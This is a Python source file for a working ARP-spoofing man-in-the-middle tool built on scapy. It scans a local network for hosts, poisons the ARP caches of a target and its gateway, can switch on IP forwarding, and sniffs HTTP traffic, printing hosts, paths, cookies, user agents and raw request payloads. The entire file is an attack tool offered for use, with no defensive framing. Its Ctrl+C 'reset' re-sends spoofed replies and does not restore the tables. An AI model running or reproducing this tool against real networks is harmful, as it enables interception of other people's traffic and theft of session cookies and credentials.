import scapy.all as scapy
import scapy.layers.http as http
from scapy.all import ARP, Ether, srp
import time
import sys
import argparse
from rich import print
from rich.console import Console
from rich.table import Table
import ipaddress
import os
import threading

console = Console()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None


def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        console.print(f"[bold red]Error:[/] Could not find MAC address for target IP: {target_ip}")
        sys.exit(1)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)



def forward_packet(packet, target_ip, gateway_ip):
    # Hedef IP ve Gateway IP'ye yönlendirme
    if packet[scapy.IP].src == target_ip:
        packet[scapy.IP].dst = gateway_ip
    elif packet[scapy.IP].dst == gateway_ip:
        packet[scapy.IP].dst = target_ip
    scapy.send(packet, verbose=False)

def sniff_packets(interface, target_ip, gateway_ip, method=None):
    try:
        scapy.sniff(iface=interface, store=False, prn=lambda packet: process_packet(packet, target_ip, gateway_ip, method))
    except OSError as e:
        console.print(f"[bold red]Error:[/] {e}")
        sys.exit(1)

def process_packet(packet, target_ip, gateway_ip, method=None):
    if packet.haslayer(http.HTTPRequest):
        request = packet[http.HTTPRequest]

        # IP adresi ve MAC adresini al
        ip = packet[scapy.IP].src
        mac = packet[scapy.Ether].src

        if method and request.Method.decode() != method:
            return

        console.print("\n[bold blue]HTTP Request:")
        console.print(f"    Method: [green]{request.Method}[/green]")
        console.print(f"    Host: [green]{request.Host}[/green]")
        console.print(f"    Path: [green]{request.Path}[/green]")
        console.print(f"    Source IP: [green]{ip}[/green]")
        console.print(f"    Source MAC: [green]{mac}[/green]")
        if request.Path.startswith(b"https"):
            console.print(f"    Protocol: [green]HTTPS[/green]")
        else:
            console.print(f"    Protocol: [green]HTTP[/green]")

        if request.Cookie:
            console.print(f"    Cookie: [green]{request.Cookie}[/green]")

        if request.User_Agent:
            console.print(f"    User-Agent: [green]{request.User_Agent}[/green]")
        if packet.haslayer(scapy.Raw):
            console.print("\n[bold red]Raw Payload:")
            payload = packet[scapy.Raw].load
            console.print(f"[red]{payload}[/red]")

    if packet.haslayer(http.HTTPResponse):
        response = packet[http.HTTPResponse]

        console.print("\n[bold blue]HTTP Response:")
        console.print(f"    Status Code: [green]{response.Status_Code}[/green]")
        console.print(f"    Content Type: [green]{response.Content_Type}[/green]")
        console.print("\n" + "-"*90)


def scan(target, iface):
    arp = ARP(pdst=target)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    try:
        result = srp(packet, timeout=3, verbose=0, iface=iface)[0]
    except PermissionError:
        console.print("[bold red]Error:[/] You do not have sufficient privileges. Try running the program with 'sudo'.")
        exit()
    except OSError as e:
        if "No such device" in str(e):
            console.print(f"[bold red]Error:[/] Interface '{iface}' does not exist. \nPlease provide a valid interface name.")
            exit()
        else:
            raise

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
    parser.add_argument("-i", "--interface", dest="interface", help="Interface name")
    parser.add_argument("-tf", "--targetfind", dest="target_find", help="Target IP range to find")
    parser.add_argument("--ip-forward", "-if", action="store_true", help="Enable packet forwarding")
    parser.add_argument("-m", "--method", dest="method", help="Limit sniffing to a specific HTTP method")
    options = parser.parse_args()

    if options.target_find:
        ip_list = scan(options.target_find, options.interface)
        console.print("\n[bold green]Device discovery")
        console.print("\n[red]**************************************[/red]")
        console.print("[blue]   Ip Address\t    Mac Address[/blue]")
        console.print("[red]**************************************[/red]")
        for ip in ip_list:
            console.print(f"    [green]{ip['ip']}[/green]\t  {ip['mac']}")
        console.print()
        sys.exit(0)

    if not options.target_ip:
        parser.error("[-] Please specify a target IP address using -t or --target.")
    if not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address using -g or --gateway.")
    if not options.interface:
        parser.error("[-] Please specify the interface name using -i or --interface.")

    # Paket yönlendirme özelliğini etkinleştir
    if options.ip_forward:
        os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")

    return options

options = main()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
interface = options.interface
method = options.method

try:
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        console.print("******************* started sniff *******************")
        sniff_packets(interface, target_ip, gateway_ip, method)
except KeyboardInterrupt:
    console.print("\n[bold green]Detected Ctrl+C. Resetting ARP tables...")
    # Yönlendirme tablolarını sıfırla
    arp_spoof(gateway_ip, target_ip)
    arp_spoof(target_ip, gateway_ip)
    sys.exit(0)
console.print("See you later honey")

